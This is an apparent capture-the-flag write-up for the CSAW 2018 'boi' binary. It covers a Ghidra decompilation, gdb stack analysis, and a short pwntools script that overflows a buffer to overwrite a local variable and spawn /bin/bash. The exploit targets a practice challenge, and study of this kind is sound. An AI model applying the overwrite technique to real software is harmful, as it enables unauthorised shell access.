'''
boi challenge from CSAW-Cybersecurity Games and Conference 2018
Jake Mai

binary given, no source code.
'file' and 'checksec' output:
    64 bit binary
    dynamically linked
    not stripped
    Stack Canary found
    Non Exec Stack enable

Execute the binary:
./boi
Are you a big boiiiii??
<prompt for input>: yueahhhhhhhh
prints out the time

******************************************************************

+> Main function decompiled by Ghidra:

int main(void)
{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 local_28;
  int iStack36;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack36 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack36 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

******************************************************************
+> so local_38 is our buffer, reads in 0x18 bytes

+> Stack View in Ghidra shows that:
-----------------------------------------------------------------------------
0040067e c7 45 e4        MOV        dword ptr [RBP + local_28+0x4],0xdeadbeef
        ef be ad de
-----------------------------------------------------------------------------

+> iStack36 is assigned value: 0xdeadbeef (iStack36 is an int, and is right above local_28)

+> Then later down, it is then compared with: 0xcaf3baee
-----------------------------------------------------------------------------
004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + local_28+0x4]
004006a8 3d ee ba        CMP        EAX,0xcaf3baee
         f3 ca
-----------------------------------------------------------------------------

+> So, we need to find the distance between iStack36 and local_38, fill up local_38 and any space between, then overwrite iStack36 with 0xcaf3baee. We don't need to execute any shell code or overwrite over the ret address so Canary and NX mitigation should not be a problem.

+> Open up gdb, set a breakpoint after the read instructions and examine the stack
+> The program hits the breakpoint, we can search for local_38 and iStack36:
-----------------------------------------------------------------------------
pwndbg> search -t bytes yeahhh
[stack]         0x7fffffffde20 0xa686868616579 /* 'yeahhh\n' */
pwndbg> search -t qword 0xdeadbeef
[stack]         0x7fffffffde34 0xdeadbeef
-----------------------------------------------------------------------------
+> The distance between them would be 0x14 bytes apart
+> The program reads in 0x18 bytes from out input (read(0,&local_38,0x18);)
+> So we would need to fill up 0x14, then the last 4 bytes as 0xcaf3baee should overwrite iStack36

'''
# Exploit

from pwn import *

def pwn():
    leshgo = process('./boi')
    payload = b'A'*20 + p32(0xcaf3baee)
    leshgo.sendline(payload)
    leshgo.interactive()

if __name__ == "__main__":
    pwn()

# Exploit runs sucessfully, we got a a shell
